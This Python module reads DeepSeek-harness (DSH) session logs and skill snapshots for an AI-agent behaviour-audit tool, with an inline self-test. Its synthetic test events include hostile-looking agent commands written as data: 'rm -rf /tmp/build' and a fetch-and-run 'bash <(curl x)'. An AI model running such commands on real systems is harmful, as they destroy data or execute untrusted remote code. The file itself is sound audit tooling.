"""DSH session log (JSONL) reader for trigger evidence (A10).

DSH 默认会话持久化是 `session-persistence-jsonl`，落盘在
`<DSH_HOME>/sessions/<project>/<id>/session.jsonl[.zstd]`。本读取器只认
裸文本 `.jsonl`（等价于 `compression:'none'`）；zstd 解压是上游的事，不在这里做。

只依赖标准库 `json`。逐行读、逐行 `json.loads`；任何一行不是合法 JSON 就降级，
**绝不假装「读到了 0 条」**——报 0 次会直接伪造出假的 SV201。格式见
`fixtures/dsh/README.md` 与 `docs/HOST_ADAPTER_CONTRACT.md` 的 DSH 一节。
"""

import json
import os
from pathlib import Path

from ..agent.usage import usage_shaped_tokens
from ..util import split_lines

# DSH 自述 SESSION_FORMAT_VERSION 恒为 0、不作兼容承诺；不相符即降级。
# 它是头行 `version` 字段，不是 SQLite 后端的 `PRAGMA user_version`（那是表结构版本）。
EXPECTED_SESSION_FORMAT_VERSION = 0

# A11 快照形状的版本闸：DSH_INTEGRATION.md §2.2.1 / §2.2.2 的权威契约。
# 这里只声明「我们认哪些版本」，新版本出现时扩这个集合。
# **不能默默兼容未知版本**——老的快照会被误读成新形状，silent corruption。
SUPPORTED_SNAPSHOT_SCHEMA_VERSIONS = frozenset({"1.0"})
# 写快照的必须是 dsh-agent-vitals bundle（DSH-1 的 glue plugin）。允许带版本后缀
# 形式（如 "dsh-agent-vitals/1.2.3"），但不接受其他字符串——第三方写的快照形状
# 可能相同但语义不一致，不能替它背书。
EXPECTED_PRODUCER_PREFIX = "dsh-agent-vitals"

# 行为审计规则引擎（SV601–SV610，behavior.py）吃的执行事件类型。抽取时只做
# 「过滤 + 原样透传」——不匹配规则、不裁决（规则引擎是另一层）。字段 shape 已对照
# deepseek-harness 源码核实（见 docs/AGENT_BEHAVIOR_AUDIT.md §3.2 / §6.5）：
#   tool/call       data.arguments 是原始 JSON 字符串（未解析）
#   tool/result     data.error.code 六码：FS_SANDBOX_DENIED / TOOL_TIMEOUT / ABORTED /
#                   ABORTED_BEFORE_DISPATCH / UNKNOWN_TOOL / SANDBOX_UNAVAILABLE
#   approval/*      审计对按 data.id 关联（不是 callId）；outcome 四值
#   sandbox/mode    data.mode 三值
#   hook/*          hook 拦截的 invoked/result 对
#   code-dispatch*  run_code 嵌套子调用，data.arguments 是 JSON 对象（不是字符串）
EXECUTION_EVENT_TYPES = frozenset((
    "tool/call",
    "tool/result",
    "approval/asked",
    "approval/decided",
    "sandbox/mode",
    "hook/invoked",
    "hook/result",
    "tool/code-dispatch-start",
    "tool/code-dispatch",
    # 轨迹级检测器（trajectory.py，SV611–614）的 turn/step 边界信号：
    # SV612 死循环按 turn/start 分组、SV613 停滞看 turn/end.reason.kind 与
    # step/end 心跳。原 9 类是单事件规则的证据，这四个补轨迹层的视野。
    "turn/start",
    "step/start",
    "turn/end",
    "step/end",
    # compaction/*：时间线的 ✂ 标记，prune 的 shadowedTokenCount 是宿主实测的
    # 被丢弃 token 数（FR-04b 的浪费量来源）。放在**执行事件**而不是 usage 事件
    # 里，是因为 compaction_events 要靠这里已有的 turn/start·turn/end 给 prune
    # 顺延 turn —— prune 自身不带 turn，挂进 usage_events 会全部落成 null。
    "compaction/start",
    "compaction/summary",
    "compaction/end",
    "compaction/prune",
    # 会话日志头。本身不产 finding、也不带用量，但所有分析都要靠它的
    # seedLength 划出「这个会话自己干的」与「从上游 branch 时抄进来的历史」。
    "session",
))

# T2（Skill 执行审计）：`skill-invocation`（用户显式 `/<name>` 调用）与
# skill-catalog 同款处境——不是独立事件类型，挂在 user/message 的
# data.source.kind 上。判定必须按 source.kind，不能把 user/message 整体塞进
# EXECUTION_EVENT_TYPES：那会把所有用户消息（含原始 prompt 文本）收进执行
# 事件流，体积爆炸 + 把未脱敏内容带进投影和导出。Rust 平行实现见
# `src/dsh.rs` 的同名判定（内联，未抽成函数）。


def _is_skill_invocation_carrier(event):
    data = event.get("data")
    source = data.get("source") if isinstance(data, dict) else None
    return isinstance(source, dict) and source.get("kind") == "skill-invocation"


def read_session_log(path):
    """逐行读一个 DSH 会话 JSONL，返回触发证据。

    第 1 行是 `SessionHeader`（`{"type":"session","version":0,...}`），其后每行一个
    `SessionEvent`（camelCase 字段 `type`/`seq`/`time`/`data`，表面事件带 `surfaceOp`）。

    返回 dict 字段：
      catalog_entries   最近一次 `skill-catalog` 发布的名字列表（后发覆盖先发）
      invoked           `skill-invocation` 命中名字列表（按 seq 顺序追加）
      selected          `tool/call`(name="skill") 命中名字列表（按 seq 顺序追加）
      execution_events  执行事件列表（按 seq 递增），元素 `{type, seq, time, data}`；
                        `data` 原样透传（键序不动）；降级时为 null（绝不假装 0 条）。
                        除 `EXECUTION_EVENT_TYPES` 白名单外，`skill-invocation`
                        载体（T2）也按 source.kind 放行——不在白名单数组里，
                        判定逻辑单独在调用点
      usage_events     成本账事件列表（request/header + 带 usage 的 chunk/message），
                        同 execution_events 的 reshape；供 usage.token_by_model 消费；
                        降级时为 null
      degraded          False 表示读全了；字符串表示降级原因
    """
    result = {
        "catalog_entries": [],
        "invoked": [],
        "selected": [],
        "execution_events": None,
        "usage_events": None,
        "cwd": None,
        "degraded": False,
    }

    try:
        text = Path(path).read_text(encoding="utf-8", errors="replace")
    except OSError:
        result["degraded"] = "file-missing"
        return result

    # JSONL 记录边界只能是真正的换行——str.splitlines() 额外认的那批 Unicode
    # 段落/换行符（U+2028、U+0085…）合法出现在 JSON 字符串值里，用它切会把
    # 一整行 JSON 拦腰斩断，把可读的日志误判成 non-json（真实用户日志
    # session-9681e216 实测触发）。split_lines 与 Rust util::split_lines
    # 逐字节对齐，只认 \n / \r\n / \r。
    lines = split_lines(text)
    if not lines:
        result["degraded"] = "missing-header"
        return result

    # 第 1 行是 SessionHeader（HeaderLine）：`type=="session"` 判别头行，`version`
    # 是版本闸。先验 type，再验 version —— 两者缺一即「缺 header」。
    try:
        header = json.loads(lines[0])
    except json.JSONDecodeError:
        result["degraded"] = "non-json"
        return result
    if (not isinstance(header, dict) or header.get("type") != "session"
            or "version" not in header):
        result["degraded"] = "missing-header"
        return result
    version = header.get("version")
    # 只认整数 0。bool 是 int 子类（`False == 0`），必须显式排除，否则
    # `{"version": false}` 会溜过 `!= 0` 检查；浮点 `0.0` 同样要挡在门外。
    if (isinstance(version, bool) or not isinstance(version, int)
            or version != EXPECTED_SESSION_FORMAT_VERSION):
        result["degraded"] = "schema-version-mismatch"
        return result
    # 工作区根（可选字段）：SV605 用它判断「工作区外写」。缺失时 None → 退化
    # 为纯绝对路径启发式（宁可多报不误放）。
    result["cwd"] = header.get("cwd")

    execution_events = []
    usage_events = []
    # 会话分叉边界（可选字段）：从上游 branch 出来时，日志前 seedLength 个事件
    # 是上游历史的原样拷贝。post_fork 只认这个数——它没有对应的事件类型，日志头
    # 本身也没有 data 字段（_reshaped_event 会丢掉它），所以在这里合成一个规整
    # 形状的边界事件。缺席就是没分叉，一个事件都不滤。
    _seed = header.get("seedLength")
    if isinstance(_seed, int) and not isinstance(_seed, bool) and _seed > 0:
        _marker = {"type": "session", "seq": None, "time": None,
                   "data": {"seedLength": _seed}}
        execution_events.append(_marker)
        usage_events.append(dict(_marker))
    for line in lines[1:]:
        if not line.strip():
            # 空白行不是事件，跳过（真实 writer 只在末尾补一个换行，不会产生空行）
            continue
        try:
            event = json.loads(line)
        except json.JSONDecodeError:
            result["degraded"] = "non-json"
            return result
        if not isinstance(event, dict):
            # 合法 JSON 但不是事件对象：不匹配任何证据，不是降级
            continue
        etype = event.get("type")

        # 执行事件：只「过滤 + 原样透传」，不匹配规则（规则引擎是另一层）。
        # `data` 原样保留（键序不动），`seq`/`time`/`data` 都从事件里原样取，
        # 缺了以 null 落位（绝不伪造 0 次）。
        if etype in EXECUTION_EVENT_TYPES or _is_skill_invocation_carrier(event):
            exec_data = event.get("data")
            if isinstance(exec_data, dict):
                execution_events.append({
                    "type": etype,
                    "seq": event.get("seq"),
                    "time": event.get("time"),
                    "data": exec_data,
                })

        # 成本账事件：request/header（模型）+ 带 usage 的 chunk/message。与
        # execution_events 同一 reshape，独立成字段供成本折叠（usage.py）消费。
        if _is_usage_event(event, etype):
            usage_data = event.get("data")
            if isinstance(usage_data, dict):
                usage_events.append({
                    "type": etype,
                    "seq": event.get("seq"),
                    "time": event.get("time"),
                    "data": usage_data,
                })

        data = event.get("data")
        if not isinstance(data, dict):
            data = {}

        if etype == "user/message":
            source = data.get("source")
            if isinstance(source, dict):
                kind = source.get("kind")
                if kind == "skill-catalog":
                    # 目录发布：`entries` 是那一刻发布的精确条目（名字 + 截断描述）。
                    # 取名字列表，覆盖上一次 ——「最近一次发布」才是当前状态。
                    entries = source.get("entries")
                    names = []
                    if isinstance(entries, list):
                        for entry in entries:
                            if isinstance(entry, dict):
                                name = entry.get("name")
                                if isinstance(name, str):
                                    names.append(name)
                    result["catalog_entries"] = names
                elif kind == "skill-invocation":
                    # 用户显式调用（`/<name>` 手势）：取 `source.name`。
                    name = source.get("name")
                    if isinstance(name, str):
                        result["invoked"].append(name)
        elif etype == "tool/call" and data.get("name") == "skill":
            # 模型选中加载：`arguments` 是模型产出的原始 JSON 字符串（未解析），
            # 解析后取 `name`。
            args_raw = data.get("arguments")
            if isinstance(args_raw, str):
                try:
                    args = json.loads(args_raw)
                except json.JSONDecodeError:
                    args = None
                if isinstance(args, dict):
                    name = args.get("name")
                    if isinstance(name, str):
                        result["selected"].append(name)

    result["execution_events"] = execution_events
    result["usage_events"] = usage_events
    return result


def _is_usage_event(event, etype):
    """成本与上下文折叠需要的事件。Rust 平行实现见 `src/dsh.rs::is_usage_event`。

    名字沿用 usage，但覆盖面已扩到四个消费者：token_by_model（按模型分桶）、
    request_metrics（逐请求时间序列）、context_composition（常驻上下文构成）、
    hour_buckets/token_by_date_model（按时间分桶）。这四者共用同一个数组，
    各取所需，不认识的事件类型自然跳过。

    - request/header —— 模型标识，**以及** header.system / header.tools。
      reshape 保留整个 data，所以 FR-04a 要的系统提示词与工具定义不用另抽一路。
    - request/context —— data.contextWindow，上下文占用率的分母，此前没有任何
      一处保留它。真实会话一个 session 只出现 5 次，体积可忽略。
    - 承载技能目录的事件 —— 目录**不是专用事件类型**，挂在 user/message /
      agent/inbox/spliced 等多种事件的 data.source 上，所以按 data.source.kind
      判断而不是 type 白名单。真实会话只有 3 次发布。
    - usage 样本 —— assistant/chunk 的 usage 型、带 usage 的 assistant/message、
      带 usage 的 compaction/summary（`usage.py::_usage_sample` 认识的三种）。

    **兜底：结构看起来带 usage 的事件，即使类型不在上面这份名单里，也保留**
    （`usage_shaped_tokens`——判据是"payload 里有我们认得的 token 字段名"，
    与折叠层的残差哨兵是**同一个函数**）。这是这层过滤本身曾经漏钱的直接
    教训：`compaction/summary` 在这一步就被挡在外面，`token_by_model` 那边
    的哨兵因此从来看不到它，报出"0 处漏算"这个假阴性——真实语料扫描了很久
    才靠人工翻原始日志才发现。宽进（这里）、严出（真正计价只走
    `_usage_sample` 的显式白名单）——机器负责发现，人负责归类，两条路径
    不能合并成一条，否则同一笔用量在多个事件里重复出现时会被双计。

    非 usage chunk（文本流）与无 usage 的 message 仍不保留——体积控制。
    """
    data = event.get("data")
    # 与 Rust 的判定顺序一致：先看 data.source.kind（data 非 dict 时自然落空），
    # 再按 type 判。request/header 即使 data 畸形也返回 True——两侧都由下游的
    # reshape（data 非 dict 就丢弃）兜底，保持谓词本身逐条对齐，不留暗坑。
    source = data.get("source") if isinstance(data, dict) else None
    if isinstance(source, dict) and source.get("kind") == "skill-catalog":
        return True
    # 分叉边界同样要进 usage_events：四个消费者各自 post_fork，看不到边界就
    # 滤不掉上游会话的用量（见 util.fork_boundary 的实测数据）。
    if etype == "session":
        return True
    if etype in ("request/header", "request/context"):
        return True
    if not isinstance(data, dict):
        return False
    if etype == "assistant/chunk":
        chunk = data.get("chunk")
        if isinstance(chunk, dict) and chunk.get("type") == "usage":
            return True
    elif etype == "assistant/message":
        if "usage" in data:
            return True
    elif etype == "compaction/summary":
        if isinstance(data.get("usage"), dict):
            return True
    # 兜底：结构看着像 usage 但类型不认识——留给折叠层的残差哨兵去报警，
    # 不在这里悄悄丢掉（见函数文档）。
    return usage_shaped_tokens(data) is not None


def read_session_evidence(env=None):
    """读一次会话日志证据，来自环境变量 ``AGENT_VITALS_DSH_SESSION_LOG``。

    返回 ``(source, evidence)``：
      source    环境变量原始值（进报告里的 source 串），未设置时为 None
      evidence  ``read_session_log`` 的 dict，未设置时为 None

    环境变量可指向一个裸文本 ``.jsonl`` 文件，也可指向一个目录——目录则读
    其中的 ``session.jsonl``（与默认落盘路径 ``<DSH_HOME>/sessions/<project>/
    <id>/session.jsonl`` 对齐）。读不到的降级由 ``read_session_log`` 兜底成
    ``degraded="file-missing"``，这里**不把它冒充成「没有证据」**——两者在
    报告里含义不同：前者是「有证据源但读坏了」，后者是「压根没配证据源」。

    （真机自动从 ``$DSH_HOME/sessions/`` 发现留后续，本波先靠环境变量注入。）
    """
    environment = os.environ if env is None else env
    raw = environment.get("AGENT_VITALS_DSH_SESSION_LOG")
    if not raw:
        return None, None
    path = Path(raw)
    if path.is_dir():
        path = path / "session.jsonl"
    return raw, read_session_log(path)


def read_snapshot(path):
    """读 ``--runtime-json <file>`` 摄入的注册表快照（probe 证据，A11）。

    快照是 ``ctx.skills.snapshot()`` 的产物，由 dsh-agent-vitals 的 glue plugin
    写到 ``$DSH_HOME/agent-vitals/snapshot.json``。形状（见 DSH_INTEGRATION §2.2.1）：

        {"schema_version": "1.0", "producer": "dsh-agent-vitals", "observer": null,
         "skills": [{"name": "...", "description": "...", ...}], "complete": true,
         "written_at": "ISO8601"}

    **版本闸**：`schema_version` 必须在 ``SUPPORTED_SNAPSHOT_SCHEMA_VERSIONS`` 里，
    `producer` 必须以 ``dsh-agent-vitals`` 开头。任一不符即 ``unknown-schema-version``
    / ``unknown-producer``——静默兼容是 silent corruption 的源头。

    映射（契约「Two independent evidence sources」，**绝不折叠**）：
      - ``complete === true``  → 快照里的名字是「此刻这个 scope 解析出的目录」；
      - ``complete === false`` → 全部 ``unknown``，不是 ``false``；
      - 缺失 / 畸形 / schema 不符 → ``degraded``（``unavailable``），绝不报 0 次。

    返回 dict：
      catalog_entries   快照里的 skill 名列表（按快照顺序）
      complete          True / False；畸形时为 None（伴随 degraded）
      observer          None 或字符串（v1 恒为 None，全局 scope）
      written_at        None 或 ISO8601 字符串（probe 的时间坐标）
      degraded          False 表示读全了；字符串表示降级原因
    """
    result = {
        "catalog_entries": [],
        "complete": None,
        "observer": None,
        "written_at": None,
        "degraded": False,
    }

    try:
        text = Path(path).read_text(encoding="utf-8", errors="replace")
    except OSError:
        result["degraded"] = "file-missing"
        return result

    try:
        doc = json.loads(text)
    except json.JSONDecodeError:
        result["degraded"] = "non-json"
        return result
    if not isinstance(doc, dict):
        result["degraded"] = "not-an-object"
        return result

    skills = doc.get("skills")
    if not isinstance(skills, list):
        result["degraded"] = "missing-skills"
        return result
    complete = doc.get("complete")
    if isinstance(complete, bool) is False:
        # complete 是「发现是否完整」的二态闸，任何非布尔都不能当 partial 答案用；
        # 把 0/1 当 complete 会在下面把「部分答案」误判成「目录为空」。
        result["degraded"] = "missing-complete"
        return result
    schema_version = doc.get("schema_version")
    if schema_version not in SUPPORTED_SNAPSHOT_SCHEMA_VERSIONS:
        # schema_version 是契约的版本闸；不支持的版本必须降级，而不是猜测兼容。
        # 一旦静默接受，未来加字段时老快照会被误读成新形状 —— silent corruption
        # 是最难追的一类 bug。
        result["degraded"] = "unknown-schema-version"
        return result
    producer = doc.get("producer")
    if (not isinstance(producer, str)
            or not producer.startswith(EXPECTED_PRODUCER_PREFIX)):
        # producer 是「谁写的快照」。不是 dsh-agent-vitals bundle 写的，可能是
        # 用户手写的、其他工具的、甚至是攻击者构造的。一律降级，不替它背书——
        # 「形状对得上」不等于「语义对得上」。
        result["degraded"] = "unknown-producer"
        return result

    names = []
    for entry in skills:
        if isinstance(entry, dict):
            name = entry.get("name")
            if isinstance(name, str):
                names.append(name)
    result["catalog_entries"] = names
    result["complete"] = complete
    observer = doc.get("observer")
    result["observer"] = observer if isinstance(observer, str) else None
    written_at = doc.get("written_at")
    result["written_at"] = written_at if isinstance(written_at, str) else None
    return result


def _self_test():
    """内联 JSONL 自检：验证 execution_events 的「过滤 + 原样透传」分支。

    不是 unittest（本模块是库，不进 tests/ 发现），`python3 -m agent_vitals.adapters.dsh`
    或直接跑本文件即可。断言与 `src/dsh.rs` 的 execution_events 测试逐一对应。
    """
    import tempfile

    def _run(text):
        with tempfile.NamedTemporaryFile("w", suffix=".jsonl", delete=False) as f:
            f.write(text)
            path = f.name
        try:
            return read_session_log(path)
        finally:
            os.unlink(path)

    header = {"type": "session", "version": 0, "id": "s", "delegationDepth": 0}
    events = [
        # 轨迹层边界信号（EXECUTION_EVENT_TYPES 扩展）：SV612/613 需要
        # turn/start 分组与 turn/end.reason.kind
        {"type": "turn/start", "seq": 1, "time": 1001, "data": {"turn": 1}},
        {"type": "step/start", "seq": 2, "time": 1002, "data": {"turn": 1, "step": 1}},
        # tool/call：arguments 是原始 JSON 字符串（未解析）
        {"type": "tool/call", "seq": 3, "time": 1003,
         "data": {"turn": 1, "step": 1, "callId": "c1", "name": "bash",
                  "arguments": '{"command":"rm -rf /tmp/build"}'}},
        # tool/result：error.code（六码之一）
        {"type": "tool/result", "seq": 4, "time": 1004,
         "data": {"turn": 1, "step": 1, "message": "denied",
                  "error": {"name": "FsError", "code": "FS_SANDBOX_DENIED"},
                  "meta": {"n": 1}}},
        # approval/asked + approval/decided：按 data.id 关联（不是 callId）
        {"type": "approval/asked", "seq": 5, "time": 1005,
         "data": {"id": "a1", "toolName": "bash", "callId": "c1", "reason": "escalation"}},
        {"type": "approval/decided", "seq": 6, "time": 1006,
         "data": {"id": "a1", "outcome": "allowed-once"}},
        # sandbox/mode：data.mode 三值之一
        {"type": "sandbox/mode", "seq": 7, "time": 1007,
         "data": {"mode": "danger-full-access"}},
        # hook/invoked + hook/result
        {"type": "hook/invoked", "seq": 8, "time": 1008,
         "data": {"turn": 1, "point": "PreToolUse", "handlerId": "h1"}},
        {"type": "hook/result", "seq": 9, "time": 1009,
         "data": {"turn": 1, "point": "PreToolUse", "handlerId": "h1", "decision": "pass"}},
        # code-dispatch*：arguments 是 JSON 对象（不是字符串）
        {"type": "tool/code-dispatch-start", "seq": 10, "time": 1010,
         "data": {"rootCallId": "r1", "parentCallId": "p1", "subCallId": "p1:code:0",
                  "name": "bash", "arguments": {"command": "bash <(curl x)"}}},
        {"type": "tool/code-dispatch", "seq": 11, "time": 1011,
         "data": {"rootCallId": "r1", "parentCallId": "p1", "subCallId": "p1:code:0",
                  "name": "bash", "arguments": {"command": "bash <(curl x)"},
                  "isError": False, "content": []}},
        {"type": "step/end", "seq": 12, "time": 1012, "data": {"turn": 1, "step": 1}},
        {"type": "turn/end", "seq": 13, "time": 1013,
         "data": {"turn": 1, "reason": {"kind": "completed"}}},
        # 非执行事件：应被过滤
        {"type": "user/message", "seq": 14, "time": 1014,
         "data": {"source": {"kind": "user"}}, "surfaceOp": "append"},
        # 成本账事件：request/header（模型标识）
        {"type": "request/header", "seq": 15, "time": 1015,
         "data": {"header": {"config": {"model": "deepseek/deepseek-v4-pro-0813"}}}},
        # usage chunk：保留
        {"type": "assistant/chunk", "seq": 16, "time": 1016,
         "data": {"turn": 1, "step": 2, "chunk": {"type": "usage",
                  "usage": {"inputTokens": 1000, "outputTokens": 200, "cacheReadTokens": 300}}}},
        # 文本 chunk（非 usage）：应被过滤（体积控制，折叠层也不消费）
        {"type": "assistant/chunk", "seq": 17, "time": 1017,
         "data": {"turn": 1, "step": 2, "chunk": {"type": "text", "text": "你好"}}},
        # message 带 usage：保留
        {"type": "assistant/message", "seq": 18, "time": 1018,
         "data": {"turn": 1, "step": 2, "usage": {"inputTokens": 1200,
                  "outputTokens": 250, "cacheReadTokens": 300}}},
        # message 无 usage：应被过滤
        {"type": "assistant/message", "seq": 19, "time": 1019,
         "data": {"turn": 1, "step": 3, "message": {"content": []}}},
    ]
    text = json.dumps(header) + "\n" + "\n".join(json.dumps(e) for e in events) + "\n"
    d = _run(text)
    assert d["degraded"] is False
    # 13 类执行事件：9 类单事件规则证据 + 4 类轨迹层边界信号（turn/start、
    # step/start、step/end、turn/end）
    assert [e["type"] for e in d["execution_events"]] == [
        "turn/start", "step/start", "tool/call", "tool/result",
        "approval/asked", "approval/decided", "sandbox/mode",
        "hook/invoked", "hook/result",
        "tool/code-dispatch-start", "tool/code-dispatch",
        "step/end", "turn/end",
    ]
    # 按 seq 递增有序
    assert [e["seq"] for e in d["execution_events"]] == list(range(1, 14))
    assert [e["time"] for e in d["execution_events"]] == list(range(1001, 1014))
    # data 原样透传：tool/call（index 2）的 arguments 是字符串，
    # code-dispatch（index 10）的是对象
    assert isinstance(d["execution_events"][2]["data"]["arguments"], str)
    assert isinstance(d["execution_events"][10]["data"]["arguments"], dict)
    # data 键序不动（不重排）
    assert list(d["execution_events"][2]["data"].keys()) == \
        ["turn", "step", "callId", "name", "arguments"]
    # 边界事件带 turn/end.reason.kind（SV613 停滞检测的数据源）
    assert d["execution_events"][12]["data"]["reason"]["kind"] == "completed"

    # usage_events：request/header + 带 usage 的 chunk/message；文本 chunk 与
    # 无 usage 的 message 被排除（seq 15/16/18 保留，17/19 过滤）
    assert [e["type"] for e in d["usage_events"]] == [
        "request/header", "assistant/chunk", "assistant/message",
    ]
    assert [e["seq"] for e in d["usage_events"]] == [15, 16, 18]
    assert d["usage_events"][0]["data"]["header"]["config"]["model"] == \
        "deepseek/deepseek-v4-pro-0813"
    assert d["usage_events"][1]["data"]["chunk"]["usage"]["inputTokens"] == 1000
    # 不重复：usage 事件不进 execution_events
    assert all(e["type"] not in ("request/header", "assistant/chunk", "assistant/message")
               for e in d["execution_events"])

    # 降级 → execution_events / usage_events 是 None（不是 []）
    bad = json.dumps(header) + "\ngarbage line\n"
    d = _run(bad)
    assert d["degraded"] == "non-json"
    assert d["execution_events"] is None
    assert d["usage_events"] is None

    print("dsh execution_events self-test OK")


if __name__ == "__main__":
    _self_test()
